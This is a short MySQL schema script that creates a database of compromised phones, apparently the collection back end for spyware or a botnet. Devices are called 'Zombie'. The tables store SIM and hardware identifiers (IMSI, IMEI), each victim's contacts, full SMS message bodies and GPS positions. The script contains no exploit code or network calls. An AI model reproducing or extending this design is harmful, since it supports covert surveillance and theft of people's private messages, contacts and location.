DROP DATABASE SCI;
CREATE DATABASE SCI DEFAULT CHARACTER SET 'utf8';
use SCI;

CREATE TABLE Zombie (
    `email_addresses` VARCHAR(255)    NOT NULL,
    `number`          VARCHAR(32),
    `simSerial`       VARCHAR(16)     NOT NULL,
    `MCC_MNC`         VARCHAR(8)      NOT NULL,
    `IMSI`            VARCHAR(16)     NOT NULL,
    `IMEI`            VARCHAR(16)     NOT NULL,
    `deviceSerial`    VARCHAR(16)     NOT NULL,
    `manufacturer`    VARCHAR(16)     NOT NULL,
    `model`           VARCHAR(16)     NOT NULL,
    `release`         VARCHAR(8)      NOT NULL,
    PRIMARY KEY(`email_addresses`)
) ENGINE InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE Contact (
    `id`                  INTEGER         NOT NULL,
    `email_addresses`     VARCHAR(255)    NOT NULL,
    `display_name`        VARCHAR(32),
    `normalized_number`   VARCHAR(16),
    PRIMARY KEY(`id`),
    FOREIGN KEY(`email_addresses`) REFERENCES Zombie(`email_addresses`)
        ON DELETE CASCADE
        ON UPDATE CASCADE
) ENGINE InnoDB DEFAULT CHARSET=utf8; 

CREATE TABLE SMS (
    `id`              INTEGER         NOT NULL,
    `email_addresses` VARCHAR(255)    NOT NULL,
    `thread_id`       INTEGER         NOT NULL,
    `address`         VARCHAR(32)     NOT NULL,
    `body`            TEXT,
    `type`            VARCHAR(8)      NOT NULL,
    `date`            TIMESTAMP       NOT NULL,
    PRIMARY KEY(`id`),
    FOREIGN KEY(`email_addresses`) REFERENCES Zombie(`email_addresses`)
        ON DELETE CASCADE
        ON UPDATE CASCADE
) ENGINE InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE Position (
    `id`              INTEGER         NOT NULL AUTO_INCREMENT,
    `email_addresses` VARCHAR(255)    NOT NULL,
    `latitude`        DECIMAL(16, 12) NOT NULL,
    `longitude`       DECIMAL(16, 12) NOT NULL,
    `altitude`        DECIMAL(16, 12) NOT NULL,
    `accuracy`        DECIMAL(6, 3)   NOT NULL,
    `provider`        VARCHAR(8)      NOT NULL,
    PRIMARY KEY(`id`),
    FOREIGN KEY(`email_addresses`) REFERENCES Zombie(`email_addresses`)
        ON DELETE CASCADE
        ON UPDATE CASCADE
) ENGINE InnoDB DEFAULT CHARSET=utf8;
